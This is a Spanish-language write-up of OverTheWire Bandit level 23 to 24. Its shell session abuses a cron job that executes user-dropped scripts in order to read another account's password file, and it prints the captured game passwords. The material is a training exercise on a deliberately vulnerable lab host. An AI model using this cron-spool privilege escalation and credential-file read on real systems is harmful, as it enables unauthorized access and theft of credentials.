# Bandit Level 23 → Level 24



## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel 
- bandit23
- QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución
``` bash

bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ which bash
/usr/bin/bash
bandit23@bandit:/etc/cron.d$ ls -al
total 56
drwxr-xr-x   2 root root  4096 Feb 21 22:04 .
drwxr-xr-x 108 root root 12288 Feb 21 22:04 ..
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit22
-rw-r--r--   1 root root   122 Feb 21 22:03 cronjob_bandit23
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit24
-rw-r--r--   1 root root    62 Feb 21 22:03 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Feb 21 22:04 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/pass24
bandit23@bandit:/var/spool/bandit24/foo$ cd /tmp/pass24
bandit23@bandit:/tmp/pass24$ nano srcipt24.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/pass24$ ls -l
total 4
-rw-rw-r-- 1 bandit23 bandit23 66 Feb 26 01:21 srcipt24.sh
bandit23@bandit:/tmp/pass24$ cat srcipt24.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/pass24/contra24
bandit23@bandit:/tmp/pass24$ touch contra24
bandit23@bandit:/tmp/pass24$ ls
contra24  srcipt24.sh
bandit23@bandit:/tmp/pass24$ ls -l
total 4
-rw-rw-r-- 1 bandit23 bandit23  0 Feb 26 01:22 contra24
-rw-rw-r-- 1 bandit23 bandit23 66 Feb 26 01:21 srcipt24.sh
bandit23@bandit:/tmp/pass24$ chmod 777 -R /tmp/pass24
bandit23@bandit:/tmp/pass24$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23  0 Feb 26 01:22 contra24
-rwxrwxrwx 1 bandit23 bandit23 66 Feb 26 01:21 srcipt24.sh
bandit23@bandit:/tmp/pass24$ cp srcipt24.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/pass24$ cat contra24
bandit23@bandit:/tmp/pass24$ cat contra24
bandit23@bandit:/tmp/pass24$ cat contra24
bandit23@bandit:/tmp/pass24$ cat contra24
bandit23@bandit:/tmp/pass24$ cat contra24
bandit23@bandit:/tmp/pass24$ cat contra24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/pass24$
```


## Notas adicionales
| Comando | Descripción |
|------ | -------------- |
| which |  localiza los ficheros ejecutables mediante la variable de entorno PATH |
| touch | se usa principalmente para crear archivos vacíos y cambiar marcas de tiempo de archivos o carpetas |
| nano| es un editor de texto de línea de comandos fácil de usar para sistemas operativos Unix y **Linux**|

## Referencias
- [OverTheWire | Bandit (Nivel 23)](https://www.youtube.com/watch?v=lPtL7kqLyDA)
- [Comando which](https://nksistemas.com/comando-which-en-linux/#:~:text=Hoy%20veremos%20de%20que%20se,de%20las%20distribuciones%20GNU%2FLinux.)
- [Nano](https://extassisnetwork.com/tutoriales/nano-editor-de-texto-en-linux/)
